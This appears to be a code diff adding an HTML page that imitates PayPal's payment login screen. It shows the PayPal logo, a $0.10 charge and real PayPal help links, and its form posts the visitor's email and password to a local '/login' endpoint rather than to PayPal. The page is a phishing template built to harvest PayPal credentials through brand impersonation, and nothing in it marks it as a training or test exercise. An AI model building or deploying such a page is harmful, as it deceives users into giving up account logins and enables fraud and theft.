@@ -1,0 +1,49 @@
+<div class="container">
+  <div class="header">
+    <img src="paypal.png" alt="PayPal" class="logo" />
+    <span class="amount">$0.10 USD</span>
+  </div>
+
+  <h3>Pay with PayPal</h3>
+  <p class="subtitle">
+    As a member, your eligible purchases are covered by
+    <a href="https://www.paypal.com/us/digital-wallet/buyer-purchase-protection">PayPal Purchase Protection</a>.
+  </p>
+
+  <!-- Standard Form for PayPal Login -->
+  <form action="/login" method="POST">
+    <div class="form-group">
+      <label for="email">Email</label>
+      <input
+        type="email"
+        id="email"
+        name="email"
+        class="form-control"
+        required
+      />
+    </div>
+
+    <div class="form-group">
+      <label for="password">Password</label>
+      <input
+        type="password"
+        id="password"
+        name="password"
+        class="form-control"
+        required
+      />
+    </div>
+
+    <button type="submit" class="btn-primary">
+      Log In
+    </button>
+  </form>
+
+  <a href="https://www.paypal.com/us/cshelp/article/what-can-i-do-if-ive-changed-my-mobile-number-and-cant-log-in-help678" class="help-link">Having trouble logging in?</a>
+
+  <div class="divider">
+    <span>or</span>
+  </div>
+
+  <button class="btn-secondary">Pay with Debit or Credit Card</button>
+</div>
